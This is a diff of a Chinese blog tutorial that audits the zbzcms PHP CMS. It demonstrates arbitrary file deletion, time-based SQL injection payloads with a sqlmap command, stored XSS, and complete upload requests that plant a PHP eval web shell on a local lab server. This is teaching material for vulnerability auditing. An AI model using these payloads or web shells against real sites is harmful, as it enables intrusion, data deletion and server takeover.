@@ -258,92 +258,92 @@
 <p>也没用很难 供新手学习(篇幅有点长)</p>
 <p>下载地址:<a target="_blank" rel="noopener" href="http://zbzcms.com/">http://zbzcms.com/</a></p>
 <p>工具：seay phpstorm phpstudy<br>还是老方法 先用审计工具跑一波</p>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>还是现看看首页长什么样子</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>是一个智能家居网站</p>
 <p>然后逐步分析 工具跑步来的漏洞</p>
-<h3 id="第一处-任意文件删除"><a href="#第一处-任意文件删除" class="headerlink" title="第一处 任意文件删除"></a>第一处 任意文件删除</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<h3 id="第一处-任意文件删除"><a href="#第一处-任意文件删除" class="headerlink" title="第一处 任意文件删除"></a>第一处 任意文件删除</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>我们点进去查看详细</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>发现没有做任何的校验判断<br>$run从上面发现 也是通过GET传的</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>通过审计工具也可以直接看到路径</p>
 <blockquote>
 <p>/zbzcms.com/cms/cms/include/up.php?run=del</p>
 </blockquote>
 <p>那我们来构造一下<br>先在up.php同目录下创建一个txt</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>构造一下</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
 <p>执行后页面返回1<br>然后查看文件夹</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
 <p>成功删除<br>我们在上一级目录在创建一个2.txt</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
 <p>然后构造执行</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
 <p>也成功删除</p>
-<h3 id="第二处-前台sql注入"><a href="#第二处-前台sql注入" class="headerlink" title="第二处 前台sql注入"></a>第二处 前台sql注入</h3><h4 id="第一处注入点"><a href="#第一处注入点" class="headerlink" title="第一处注入点"></a>第一处注入点</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
+<h3 id="第二处-前台sql注入"><a href="#第二处-前台sql注入" class="headerlink" title="第二处 前台sql注入"></a>第二处 前台sql注入</h3><h4 id="第一处注入点"><a href="#第一处注入点" class="headerlink" title="第一处注入点"></a>第一处注入点</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
 <p>点进去详细查看</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
 <p>这里没有做过滤 我们到phpstorm里面看sql文件</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
 <p>在这个文件中可以看到 是有一个处理函数的 但是只针对 insert 和update</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
 <p>select查询函数并没有处理和其他的过滤 可直接导致注入 进行 延时注入</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
 <p>直接丢sqlmap跑了 </p>
 <blockquote>
 <p>payload：python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=dj&amp;id=1%E2%80%9C">http://127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=dj&amp;id=1“</a> -p id</p>
 </blockquote>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
 <h3 id="第二处注入点"><a href="#第二处注入点" class="headerlink" title="第二处注入点"></a>第二处注入点</h3><p>差不多和上面的一样功能点 从代码上看</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
 <p>也是get传参 调用select函数 没有任何过滤</p>
 <p>路径127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=ad&amp;id=1<br>直接构造payload了：127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=ad&amp;id=1 and sleep(2)</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\19.png" srcset="/img/loading.gif" lazyload alt="19"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/19.png" srcset="/img/loading.gif" lazyload alt="19"></p>
 <p>也是可以延时盲注的</p>
-<h3 id="第三处注入"><a href="#第三处注入" class="headerlink" title="第三处注入"></a>第三处注入</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\20.png" srcset="/img/loading.gif" lazyload alt="20"></p>
+<h3 id="第三处注入"><a href="#第三处注入" class="headerlink" title="第三处注入"></a>第三处注入</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/20.png" srcset="/img/loading.gif" lazyload alt="20"></p>
 <p>跟进查看</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\21.png" srcset="/img/loading.gif" lazyload alt="21"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/21.png" srcset="/img/loading.gif" lazyload alt="21"></p>
 <p>这直接妥妥的注入了 啥防护都没有   直接接受get参数<br>直接构造</p>
 <blockquote>
 <p>payload：[<a target="_blank" rel="noopener" href="http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1%20and%20sleep">http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1%20and%20sleep</a>(5](<a target="_blank" rel="noopener" href="http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1">http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1</a> and sleep(5))</p>
 </blockquote>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\22.png" srcset="/img/loading.gif" lazyload alt="22"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/22.png" srcset="/img/loading.gif" lazyload alt="22"></p>
 <p>就不丢sqlmap演示了</p>
-<h3 id="第四处注入"><a href="#第四处注入" class="headerlink" title="第四处注入"></a>第四处注入</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\23.png" srcset="/img/loading.gif" lazyload alt="23"></p>
+<h3 id="第四处注入"><a href="#第四处注入" class="headerlink" title="第四处注入"></a>第四处注入</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/23.png" srcset="/img/loading.gif" lazyload alt="23"></p>
 <p>我们跟进代码</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\24.png" srcset="/img/loading.gif" lazyload alt="24"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/24.png" srcset="/img/loading.gif" lazyload alt="24"></p>
 <p>这里的问题出现在tid这个参数<br>通过前面我们可以看到 如果if判断失败的话 进入else if 通过获取get传参 然后传入sql语句 这里也是没有任何防范<br>但是这里需要简单闭合一下阔号<br>我们构造</p>
 <blockquote>
 <p>payload：<a target="_blank" rel="noopener" href="http://127.0.0.1/zbzcms.com/cms/cms/include/zidong.php?id=1&tid=3">http://127.0.0.1/zbzcms.com/cms/cms/include/zidong.php?id=1&amp;tid=3)+and+sleep(1)%23&amp;laiyuan=0&amp;sou=1&amp;wid=1</a>+and+sleep(1)%23&amp;laiyuan=0&amp;sou=1&amp;wid=1)</p>
 </blockquote>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\25.png" srcset="/img/loading.gif" lazyload alt="25"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/25.png" srcset="/img/loading.gif" lazyload alt="25"></p>
 <p>这里tid参数的值还是有点点讲究 必须和数据库里面存的tid值其中之一是一样的</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\26.png" srcset="/img/loading.gif" lazyload alt="26"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/26.png" srcset="/img/loading.gif" lazyload alt="26"></p>
 <h3 id="第三处-前台存储xss"><a href="#第三处-前台存储xss" class="headerlink" title="第三处 前台存储xss"></a>第三处 前台存储xss</h3><p>这个是在发现注入的时候看见的</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\27.png" srcset="/img/loading.gif" lazyload alt="27"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/27.png" srcset="/img/loading.gif" lazyload alt="27"></p>
 <p>这处留言的地方<br>问题出现在neirong这个参数没有经过任何过滤就输出到了页面 并且还存入了数据库 所以导致后台查看的时候直接执行了</p>
 <p>这出xss需要用POST的请求方法 因为从代码上可以看到 if的判断条件是$_POST 不为空<br>然后我们来到页面构造xss</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\28.png" srcset="/img/loading.gif" lazyload alt="28"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/28.png" srcset="/img/loading.gif" lazyload alt="28"></p>
 <p>执行之后 我们登入后台来查看留言</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\29.png" srcset="/img/loading.gif" lazyload alt="29"></p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\30(1).png" srcset="/img/loading.gif" lazyload alt="30(1)"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/29.png" srcset="/img/loading.gif" lazyload alt="29"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/30(1).png" srcset="/img/loading.gif" lazyload alt="30(1)"></p>
 <p>查看详情也是直接就弹</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\31.png" srcset="/img/loading.gif" lazyload alt="31"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/31.png" srcset="/img/loading.gif" lazyload alt="31"></p>
 <p>F12查看代码 语句也加载进来了</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\32.png" srcset="/img/loading.gif" lazyload alt="32"></p>
-<h3 id="第四处-文件上传"><a href="#第四处-文件上传" class="headerlink" title="第四处 文件上传"></a>第四处 文件上传</h3><h4 id="文件上传1"><a href="#文件上传1" class="headerlink" title="文件上传1"></a>文件上传1</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\33.png" srcset="/img/loading.gif" lazyload alt="33"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/32.png" srcset="/img/loading.gif" lazyload alt="32"></p>
+<h3 id="第四处-文件上传"><a href="#第四处-文件上传" class="headerlink" title="第四处 文件上传"></a>第四处 文件上传</h3><h4 id="文件上传1"><a href="#文件上传1" class="headerlink" title="文件上传1"></a>文件上传1</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/33.png" srcset="/img/loading.gif" lazyload alt="33"></p>
 <p>从路径可以发现是后台的 (但没影响 后面发现有api路径 就是任意上传)</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\34.png" srcset="/img/loading.gif" lazyload alt="34"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/34.png" srcset="/img/loading.gif" lazyload alt="34"></p>
 <p>啥过滤 判断都没有 直接传<br>因为刚开始麻烦找payload数据那些 就在后台去找了一下上传点抓包</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\35.png" srcset="/img/loading.gif" lazyload alt="35"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/35.png" srcset="/img/loading.gif" lazyload alt="35"></p>
 <p>上传的时候抓包</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\36.png" srcset="/img/loading.gif" lazyload alt="36"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/36.png" srcset="/img/loading.gif" lazyload alt="36"></p>
 <p>然后复制返回的路径 拼接到url上打开</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\37.png" srcset="/img/loading.gif" lazyload alt="37"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/37.png" srcset="/img/loading.gif" lazyload alt="37"></p>
 <p>也是成功执行<br>整体</p>
 <blockquote>
 <p>payload：url路径：/zbzcms.com/cms/cms/admin/ajax.php?run=youad_pic<br>参数：<br>-——-WebKitFormBoundary1yVpo1vIVcMvlXNA<br>Content-Disposition: form-data; name=”0”; filename=”yjh.php”<br>Content-Type: application/octet-stream</p>
@@ -351,9 +351,9 @@
 <blockquote>
 <p>herman<br><?php [@eval](https://github.com/eval)($_POST[‘a’]); phpinfo();?><br>-——-WebKitFormBoundary1yVpo1vIVcMvlXNA—</p>
 </blockquote>
-<h4 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\38.png" srcset="/img/loading.gif" lazyload alt="38"></p>
+<h4 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/38.png" srcset="/img/loading.gif" lazyload alt="38"></p>
 <p>来到phpstorm 可以发现没有任何的过滤</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\39.png" srcset="/img/loading.gif" lazyload alt="39"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/39.png" srcset="/img/loading.gif" lazyload alt="39"></p>
 <p>直接获取到路径这些就上传<br>那我们直接构造</p>
 <blockquote>
 <p>payload：<br>POST /zbzcms.com/cms/cms/include/up.php?run=file&amp;path=../../upload/up/&amp;filename=0 HTTP/1.1<br>Host: 192.168.1.7<br>Content-Length: 238<br>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br>Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryqwBQidHCCHB076er<br>Origin: <a target="_blank" rel="noopener" href="http://192.168.1.7/">http://192.168.1.7</a><br>Referer: <a target="_blank" rel="noopener" href="http://192.168.1.7/zbzcms.com/cms/cms/admin/type.php?id=1&amp;dq=3">http://192.168.1.7/zbzcms.com/cms/cms/admin/type.php?id=1&amp;dq=3</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,is;q=0.8,zh-TW;q=0.7<br>Cookie: PHPSESSID=utnoq283ip9p4fuu5dfm56qmo5<br>Connection: close</p>
@@ -364,18 +364,18 @@
 <blockquote>
 <p>herman<br><?php [@eval](https://github.com/eval)($_POST[‘a’]); phpinfo();?><br>-——-WebKitFormBoundaryqwBQidHCCHB076er—</p>
 </blockquote>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\40.png" srcset="/img/loading.gif" lazyload alt="40"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/40.png" srcset="/img/loading.gif" lazyload alt="40"></p>
 <p>我们的访问地址：<a target="_blank" rel="noopener" href="http://192.168.1.7/zbzcms.com/cms/upload/up/16422582210.php">http://192.168.1.7/zbzcms.com/cms/upload/up/16422582210.php</a> 因为有两个../嘛 所以路径变了</p>
-<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\41.png" srcset="/img/loading.gif" lazyload alt="41"></p>
-<h4 id="文件上传3"><a href="#文件上传3" class="headerlink" title="文件上传3"></a>文件上传3</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/blog\victoryBlog\source_posts\zbzcms审计供新手学习\42.png" srcset="/img/loading.gif" lazyload alt="42"></p>
+<p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/41.png" srcset="/img/loading.gif" lazyload alt="41"></p>
+<h4 id="文件上传3"><a href="#文件上传3" class="headerlink" title="文件上传3"></a>文件上传3</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/42.png" srcset="/img/loading.gif" lazyload alt="42"></p>
 <p>在这个upload.php文件下<br>这里也是没有做任何的过滤<br>name为1的时候 也跳过了下面的后缀判断<br>直接构造payload：</p>
